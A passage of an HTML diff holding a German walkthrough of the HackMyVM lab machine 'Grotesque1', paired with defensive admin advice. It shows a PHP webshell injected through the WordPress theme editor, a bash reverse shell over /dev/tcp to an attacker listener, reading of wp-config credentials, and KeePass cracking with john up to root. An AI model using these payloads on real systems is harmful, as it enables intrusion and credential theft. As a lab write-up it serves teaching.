@@ -1,0 +1,432 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grotesque1 - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Farbe, Schwierigkeitsgrad-Farbe (Medium = Gelb/Orange) und Kreis-Farbe müssen in style.css angepasst werden -->
+    <div class="header-bg">
+        <h1>Grotesque1 - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- Farbe muss in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+            <h2>Medium</h2> <!-- Level angepasst -->
+            <div class="circle">
+                <!-- Segmentfarben müssen in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Inner-Farbe muss in style.css angepasst werden -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">dcode.fr (Webservice)</div>
+                <div class="tool-item">curl (impliziert)</div>
+                <div class="tool-item">WordPress Theme Editor</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">python3 -m http.server</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">keepass2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">KeePass Client (impliziert)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration-port-66">Enumeration Port 66 (WEBrick & Brainfuck)</a></li>
+                <li><a href="#enumeration-port-80">Enumeration Port 80 (Apache & WordPress)</a></li>
+                <li><a href="#initial-access">Initial Access (WordPress RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (www-data -> raphael -> root)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via KeePass)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.118	08:00:27:9c:83:dc	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird im lokalen Netzwerk ausgeführt, um aktive Geräte zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die IP-Adresse des Ziels wird als 192.168.2.118 identifiziert. Der Hersteller (PCS Systemtechnik GmbH) deutet auf eine VirtualBox-VM hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie 192.168.2.118 als Ziel für weitere Scans.<br><strong>Empfehlung (Admin):** Netzwerk-Monitoring und Segmentierung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.118 -p-</span></div>
+                     <pre>Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 11:24 CET
+Nmap scan report for grotesk.hmv (192.168.2.118)
+Host is up (0.00017s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">66/tcp open  http    WEBrick httpd 1.4.2 (Ruby 2.5.5 (2019-03-15))</span>
+|_http-server-header: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+<span class="command">80/tcp open  http    Apache httpd 2.4.38</span>
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: 404 Not Found
+MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Host: 127.0.1.1
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms grotesk.hmv (192.168.2.118)</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) wird auf das Ziel durchgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zwei offene HTTP-Ports werden gefunden:
+                 *   **Port 66:** Ein WEBrick HTTP-Server (Ruby). Dies ist ungewöhnlich und deutet auf eine spezielle Anwendung oder einen Entwicklungs-Server hin.
+                 *   **Port 80:** Ein Standard Apache HTTP-Server, der jedoch nur eine "404 Not Found"-Seite anzeigt. Dies könnte auf eine Fehlkonfiguration oder einen ungenutzten Virtual Host hindeuten.
+             Der Hostname `grotesk.hmv` wird identifiziert (wahrscheinlich über Reverse DNS oder NetBIOS).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                 1.  **Port 66 (höchste Priorität):** Untersuchen Sie den WEBrick-Server. Führen Sie Directory Busting durch und prüfen Sie auf bekannte Schwachstellen für WEBrick 1.4.2 oder Ruby 2.5.5.
+                 2.  **Port 80:** Führen Sie Directory Busting durch, um zu sehen, ob trotz des 404-Fehlers versteckte Inhalte vorhanden sind. Prüfen Sie, ob der Hostname `grotesk.hmv` (ggf. in `/etc/hosts` eintragen) andere Ergebnisse liefert.
+                 <br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass nur benötigte Webserver laufen. Deaktivieren Sie den WEBrick-Server, wenn er nicht für die Produktion gedacht ist. Konfigurieren Sie Apache korrekt, um keine Standard-404-Seite anzuzeigen, wenn ein Virtual Host fehlt oder falsch konfiguriert ist.</p>
+
+        </section>
+
+        <section id="enumeration-port-66">
+            <h2>Enumeration Port 66 (WEBrick & Brainfuck)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Aus dem Kontext des Berichts geht hervor, dass bei der Untersuchung des WEBrick-Servers auf Port 66 (wahrscheinlich durch manuelles Browsen oder Directory Busting, das nicht explizit gezeigt wird) zwei interessante Ressourcen gefunden wurden: die Bilddatei `/sshpasswd.png` und das Verzeichnis `/lyricsblog/`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Implizierte Funde auf Port 66 -->
+                     <pre>Gefunden: http://grotesk.hmv:66/sshpasswd.png
+Gefunden: http://grotesk.hmv:66/lyricsblog/</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine Bilddatei mit "sshpasswd" im Namen ist höchst verdächtig. Das Verzeichnis `/lyricsblog/` deutet auf eine mögliche Blog-Anwendung hin.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                 1.  Laden Sie `sshpasswd.png` herunter und untersuchen Sie es (Metadaten, Steganographie, visueller Inhalt).
+                 2.  Rufen Sie `http://grotesk.hmv:66/lyricsblog/` im Browser auf, um die Anwendung zu identifizieren.
+                 <br><strong>Empfehlung (Admin):** Speichern Sie keine sensiblen Informationen (oder Dateien mit verdächtigen Namen) im Web-Root. Sichern Sie alle Webanwendungen.</p>
+
+             <p class="analysis"><strong>Analyse (Brainfuck):</strong> Der Bericht gibt an, dass `/sshpasswd.png` Brainfuck-Code enthielt (visuell im Bild oder in den Metadaten). Dieser Code wurde extrahiert und mit einem Online-Decoder (dcode.fr) entschlüsselt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Extra hierter Brainfuck-Code aus sshpasswd.png -->
+                     <pre>+++++ +[->+ +++++ <]>++ +++++ ++++. <++++ ++++[ ->+++ +++++ <]>++ ++..<
++++[- >---< ]>--. +++++ +++.< +++[- >---< ]>--- ---.< ++++[ ->+++ +<]>+
++..++ ++.<+ +++[- >---- <]>-- -.<++ +++++ [->-- ----- <]>-- ---.< +++++
++++[- >++++ ++++< ]>++. --.-- ----- .<</pre>
+                     <!-- Hinweis auf Decoder -->
+                     <pre>https://www.dcode.fr/brainfuck-language</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verwendung von Brainfuck ist eine obskure Methode, um Informationen zu verschleiern. Die Entschlüsselung ist entscheidend. Der *entschlüsselte Text* selbst fehlt im vorliegenden Log, aber der spätere WordPress-Login legt nahe, dass der Brainfuck-Code einen Benutzernamen und/oder einen Passwort-Hash (MD5) enthielt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie den Brainfuck-Code im verlinkten Decoder aus, um die darin enthaltenen Informationen (vermutlich WordPress-Zugangsdaten oder Hash) zu extrahieren.<br><strong>Empfehlung (Admin):** Vermeiden Sie Obfuskation als Sicherheitsmaßnahme. Speichern Sie Zugangsdaten sicher (z.B. in Passwort-Managern oder Konfigurationsdateien mit korrekten Berechtigungen), nicht in Bildern oder obskuren Codeformaten im Web-Root.</p>
+
+        </section>
+
+        <section id="enumeration-port-80">
+            <h2>Enumeration Port 80 (Apache & WordPress)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.118 -x zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                     <pre>
+[...]
+<span class="command">http://192.168.2.118/javascript</span>           [Size: 319] [--> http://192.168.2.118/javascript/]
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Gobuster wird auf Port 80 ausgeführt, um nach Verzeichnissen und Dateien zu suchen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur das Verzeichnis `/javascript`. Dies bestätigt, dass Port 80 wahrscheinlich nicht der primäre Angriffsvektor ist, da der Server hauptsächlich 404-Fehler liefert. Die interessante Anwendung (`/lyricsblog/`) scheint auf Port 66 zu laufen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf Port 66 und die dort gefundene `/lyricsblog/`-Anwendung.<br><strong>Empfehlung (Admin):** Bereinigen oder konfigurieren Sie den Apache-Server auf Port 80 korrekt, wenn er nicht aktiv genutzt wird.</p>
+
+            <p class="analysis"><strong>Analyse (WordPress Identifikation):</strong> Der Bericht stellt fest, dass `http://grotesk.hmv/lyricsblog/` (erreichbar über Port 66) eine WordPress-Blog-Anwendung ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Beschreibung aus dem Text -->
+                     <pre>http://grotesqueip/lyricsblog looks like it's just a song lyrics wordpress blog <span class="comment">(Hostname/IP inkonsistent hier)</span>
+Login: http://grotesk.hmv/lyricsblog/wp-login.php</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Identifikation als WordPress ist wichtig, da WordPress eine bekannte Angriffsfläche bietet (Plugins, Themes, Benutzer-Enumeration, Brute-Force-Logins).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie Tools wie `wpscan` zur weiteren Enumeration von WordPress (Benutzer, Plugins, Themes, bekannte Schwachstellen). Versuchen Sie, sich mit den aus dem Brainfuck-Code entschlüsselten Credentials bei `wp-login.php` anzumelden.<br><strong>Empfehlung (Admin):** Halten Sie WordPress, Themes und Plugins immer auf dem neuesten Stand. Verwenden Sie starke Passwörter. Schützen Sie die `wp-login.php`-Seite (z.B. mit Fail2Ban, Captcha, 2FA).</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (WordPress RCE)</h2>
+
+            <p class="analysis"><strong>Analyse (WordPress Login):</strong> Es wird ein Login bei WordPress (`wp-login.php`) durchgeführt.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Credentials aus dem Text (vermutlich aus Brainfuck entschlüsselt) -->
+                     <pre>User: <span class="command">erdalkomurcu</span>
+Pass: <span class="password">BC78C6AB38E114D6135409E44F7CDDA2</span> <span class="comment">(MD5-Hash)</span></pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Benutzername (`erdalkomurcu`) und ein MD5-Hash werden verwendet. Es ist unklar, ob der MD5-Hash direkt als Passwort funktioniert oder ob er vorher geknackt wurde. Da der Login erfolgreich ist (siehe nächster Schritt), muss eine der beiden Annahmen zutreffen. Das Verwenden eines MD5-Hashes als Passwort wäre eine grobe Fehlkonfiguration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie bei gefundenen MD5-Hashes immer, diese zu knacken (z.B. mit Crackstation). Testen Sie sowohl den Hash als auch das geknackte Passwort.<br><strong>Empfehlung (Admin):** Verwenden Sie niemals Hashes als Passwörter. Speichern Sie Passwörter in WordPress mit dem Standard-Hashing-Mechanismus (phpass).</p>
+
+            <p class="analysis"><strong>Analyse (Theme Editor RCE):</strong> Nach erfolgreichem WordPress-Login wird der Theme-Editor (`wp-admin/theme-editor.php`) verwendet, um die `404.php`-Datei des aktiven Themes ("Twenty Fifteen") zu bearbeiten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Beschreibung aus dem Text -->
+                     <pre>URL: http://grotesk.hmv/lyricsblog/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen
+
+<span class="comment"># Inhalt, der in die 404.php eingefügt wird:</span>
+<?php
+system($_REQUEST["cmd"]);
+?></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine klassische Methode zur Codeausführung in WordPress, wenn der Theme-Editor aktiviert ist und der eingeloggte Benutzer ausreichende Rechte hat. Eine einfache PHP-Webshell wird in die `404.php` injiziert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie die modifizierte 404-Seite auf und übergeben Sie Befehle über den `cmd`-Parameter (z.B. `?cmd=id`). Etablieren Sie eine Reverse Shell für stabilen Zugriff.<br><strong>Empfehlung (Admin):** Deaktivieren Sie den Theme- und Plugin-Editor in WordPress (`define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`), um diese Art von Angriff zu verhindern. Vergeben Sie Benutzerrollen mit minimalen Rechten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Test der Webshell -->
+                     <pre>URL: http://grotesk.hmv/lyricsblog/wp-content/themes/twentyfifteen/404.php?cmd=id
+Ausgabe: <span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                     <!-- Ausführen der Reverse Shell -->
+                     <pre>URL: http://grotesk.hmv/lyricsblog/wp-content/themes/twentyfifteen/404.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die injizierte Webshell wird zuerst mit dem `id`-Befehl getestet, was bestätigt, dass sie als Benutzer `www-data` läuft. Anschließend wird ein URL-kodierter Bash-Reverse-Shell-Befehl ausgeführt, um eine Verbindung zum Listener des Angreifers (192.168.2.109:9001) herzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Webshell funktioniert und die Reverse Shell Payload wird erfolgreich ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie den Netcat-Listener auf Port 9001, um die eingehende Verbindung zu empfangen.<br><strong>Empfehlung (Admin):** Theme-Editor deaktivieren. Web Application Firewall (WAF) zur Erkennung/Blockierung von Webshells und Command Injection einsetzen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.118] 57408</span>
+bash: cannot set terminal process group (542): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@grotesque:/var/www/html/lyricsblog/wp-content/themes/twentyfifteen$</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt die Reverse Shell vom Zielsystem.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff als Benutzer `www-data` wurde erfolgreich über die WordPress RCE erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell und beginnen Sie mit der lokalen Enumeration als `www-data`.<br><strong>Empfehlung (Admin):** Untersuchen Sie die Kompromittierung, beheben Sie die WordPress-Schwachstelle und prüfen Sie auf weitere unautorisierte Änderungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehle zur Shell-Stabilisierung -->
+                     <div class="prompt">www-data@grotesque:/var/www/html/lyricsblog/wp-content/themes/twentyfifteen$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <pre>www-data@grotesque:/var/www/html/lyricsblog/wp-content/themes/twentyfifteen$</pre>
+                     <div class="prompt">www-data@grotesque:/var/www/html/lyricsblog/wp-content/themes/twentyfifteen$ <span class="command">export TERM=xterm-256color</span></div>
+                     <div class="prompt">www-data@grotesque:/var/www/html/lyricsblog/wp-content/themes/twentyfifteen$ <span class="command">Ctrl+Z</span></div>
+                     <pre>zsh: suspended  nc -lvnp 9001</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>[1]  + continued  nc -lvnp 9001</pre>
+                      <!-- Prompt kehrt in der stabilisierten Shell zurück -->
+                      <div class="prompt">www-data@grotesque:/var/www/html/lyricsblog/wp-content/themes/twentyfifteen$</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die erhaltene Reverse Shell wird mit Standardmethoden stabilisiert: Python PTY wird verwendet, um eine bessere Shell zu spawnen, `TERM` wird gesetzt, und `stty raw -echo; fg` wird auf dem Angreifersystem verwendet, um die korrekte Terminalbehandlung zu ermöglichen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Shell ist nun interaktiver und einfacher zu bedienen (z.B. mit Tab-Vervollständigung, Pfeiltasten).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun lokale Enumeration durch (z.B. `wp-config.php` lesen, `sudo -l` prüfen).<br><strong>Empfehlung (Admin):** Minimalinstallationen ohne Python können diese Stabilisierung erschweren.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (www-data -> raphael -> root)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@grotesque:/var/www/html/lyricsblog$ <span class="command">cat wp-config.php</span></div>
+                     <pre>
+[...]
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress_db' );
+
+/** MySQL database username */
+define( 'DB_USER', '<span class="command">raphael</span>' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '<span class="password">_double_trouble_</span>' );
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird die WordPress-Konfigurationsdatei `wp-config.php` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Die Datei enthält die Zugangsdaten für die MySQL-Datenbank: Benutzer `<span class="command">raphael</span>` mit dem Passwort `<span class="password">_double_trouble_</span>`. Da `raphael` auch als Systembenutzer existiert (aus `/etc/passwd`-Leak, obwohl der hier nicht gezeigt wurde), ist dies ein starker Hinweis auf wiederverwendete Passwörter.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su raphael` und dem Passwort `_double_trouble_` als Systembenutzer `raphael` anzumelden.<br><strong>Empfehlung (Admin):** Verwenden Sie niemals dasselbe Passwort für Datenbank- und Systembenutzer. Beschränken Sie die Dateiberechtigungen für `wp-config.php`, sodass sie nur für den Webserver-Prozess lesbar ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@grotesque:/var/www/html/lyricsblog$ <span class="command">su raphael</span></div>
+                     <pre>Password: <span class="password">_double_trouble_</span></pre>
+                     <div class="prompt">raphael@grotesque:/var/www/html/lyricsblog$</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `su` zum Benutzer `raphael` zu wechseln und das Datenbankpasswort wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Passwort wurde wiederverwendet. Der Angreifer agiert nun als Systembenutzer `raphael`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie lokale Enumeration als `raphael` durch. Untersuchen Sie das Home-Verzeichnis.<br><strong>Empfehlung (Admin):** Passwort-Wiederverwendung vermeiden und Richtlinien dafür durchsetzen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">raphael@grotesque:/var/www/html/lyricsblog$ <span class="command">cd</span></div>
+                     <div class="prompt">raphael@grotesque:~$ <span class="command">ls -la</span></div>
+                     <pre>total 24
+drwxr-xr-x  4 raphael raphael 4096 Nov 16 04:16 .
+drwxr-xr-x  3 root    root    4096 Jan 18  2021 ..
+-rwx------  1 raphael raphael 2174 Jan 18  2021 <span class="command">.chadroot.kdbx</span>
+drwx------  3 raphael raphael 4096 Nov 16 04:16 .gnupg
+-r-x------  1 raphael raphael   32 Jan 18  2021 <span class="command">user.txt</span>
+drwxr-xr-x 10 raphael raphael 4096 Jan 18  2021 vvmlist.github.io</pre>
+                     <div class="prompt">raphael@grotesque:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">F6ACB21652E095630BB1BEBD1E587FE7</span>raphael@grotesque:~$</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis von `raphael` wird aufgelistet. Es enthält die User-Flagge (`user.txt`) und eine KeePass-Datenbankdatei (`.chadroot.kdbx`). Die User-Flagge wird ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flagge wurde gefunden: `<span class="password">F6ACB21652E095630BB1BEBD1E587FE7</span>`. Die KeePass-Datei `.chadroot.kdbx` ist der nächste wichtige Fund für die Privilege Escalation, da sie wahrscheinlich weitere Passwörter enthält (der Name deutet auf Root-Passwörter hin).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Übertragen Sie die `.chadroot.kdbx`-Datei auf das Angreifer-System. Verwenden Sie `keepass2john` und `john` (oder Hashcat), um das Master-Passwort der KeePass-Datenbank zu knacken.<br><strong>Empfehlung (Admin):** Sensible Dateien wie Passwort-Datenbanken sollten verschlüsselt und mit starken Master-Passwörtern geschützt werden. Speichern Sie sie nicht ungeschützt im Home-Verzeichnis.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Dateiübertragung von Ziel zu Angreifer -->
+                      <div class="prompt">raphael@grotesque:~$ <span class="command">python3 -m http.server</span></div>
+                      <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.109 - - [16/Nov/2022 05:23:35] "GET /.chadroot.kdbx HTTP/1.1" 200 -</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.118:8000/.chadroot.kdbx</span></div>
+                      <pre>--2022-11-16 12:23:35--  http://192.168.2.118:8000/.chadroot.kdbx
+Verbindungsaufbau zu 192.168.2.118:8000 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 2174 (2,1K) [application/octet-stream]
+Wird in ».chadroot.kdbx« gespeichert.
+
+.chadroot.kdbx                100%[==================================>]   2,12K  --.-KB/s    in 0,01s   
+
+<span class="password">2022-11-16 12:23:35 (150 KB/s) - ».chadroot.kdbx« gespeichert [2174/2174]</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv .chadroot.kdbx chad</span></div>
+                      <!-- Kein Output -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Zielsystem (`raphael`-Shell) wird ein einfacher Python-HTTP-Server gestartet, um die `.chadroot.kdbx`-Datei bereitzustellen. Auf dem Angreifer-System wird `wget` verwendet, um die Datei herunterzuladen. Anschließend wird die Datei umbenannt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die KeePass-Datenbank wurde erfolgreich auf das Angreifer-System übertragen und für das Cracking vorbereitet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie den Hash mit `keepass2john` und knacken Sie ihn.<br><strong>Empfehlung (Admin):** Verhindern Sie das Starten von HTTP-Servern durch unprivilegierte Benutzer. Überwachen Sie ausgehende Verbindungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">keepass2john chad > chadhash</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt chadhash</span></div>
+                     <pre>Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">chatter</span>          (chad)     
+1g 0:00:00:36 DONE (2022-11-16 12:25) 0.02735g/s 739.3p/s 739.3c/s 739.3C/s clementina..andrew14
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `keepass2john` extrahiert den Hash aus der KeePass-Datei (`chad`). John the Ripper wird mit `rockyou.txt` verwendet, um das Master-Passwort zu knacken.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Master-Passwort für die KeePass-Datei lautet `<span class="password">chatter</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Öffnen Sie die KeePass-Datei (`chad`) mit einem KeePass-Client und dem Master-Passwort `chatter`. Suchen Sie nach Einträgen, insbesondere für den `root`-Benutzer.<br><strong>Empfehlung (Admin):** Verwenden Sie starke, einzigartige Master-Passwörter für Passwort-Datenbanken, die nicht in gängigen Wortlisten vorkommen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Implizierter Schritt: Öffnen der KDBX-Datei und Finden des Root-Passworts -->
+                     <pre>Keepass/root passwörter:
+----------------------------
+<span class="password">.:.subjective.:.</span>
+.:.yarak.:.
+secretservice
+rockyou.txt</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die KeePass-Datenbank wurde geöffnet (Schritt nicht explizit gezeigt). Sie enthält mehrere Einträge, darunter einen, der als Root-Passwort identifiziert wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Root-Passwort wurde gefunden: `<span class="password">.:.subjective.:.</span>`. Dies ist der Schlüssel zur vollständigen Kompromittierung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie mit `su root` und dem Passwort `.:.subjective.:.` zum Root-Benutzer.<br><strong>Empfehlung (Admin):** Speichern Sie Root-Passwörter äußerst sicher. Vermeiden Sie einfache oder thematisch verwandte Passwörter in einer Datenbank.</p>
+
+            <h2 id="proof-of-concept">Proof of Concept (Privilege Escalation via KeePass)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die folgenden Schritte demonstrieren die Eskalation zum Root-Benutzer unter Verwendung des aus der KeePass-Datenbank extrahierten Passworts.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">raphael@grotesque:~$ <span class="command">su root</span></div>
+                     <pre>Password: <span class="password">.:.subjective.:.</span></pre>
+                     <div class="prompt">root@grotesque:/home/raphael#</div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `raphael` wird `su root` ausgeführt und das gefundene Passwort eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Wechsel zum `root`-Benutzer war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie die Root-Flagge aus `/root/root.txt`.<br><strong>Empfehlung (Admin):** Ändern Sie das Root-Passwort. Beheben Sie die gesamte Angriffskette (LFI, WordPress RCE, Passwort-Wiederverwendung, unsichere KeePass-Speicherung).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@grotesque:/home/raphael# <span class="command">cd</span></div>
+                     <div class="prompt">root@grotesque:~# <span class="command">cat root.txt</span></div>
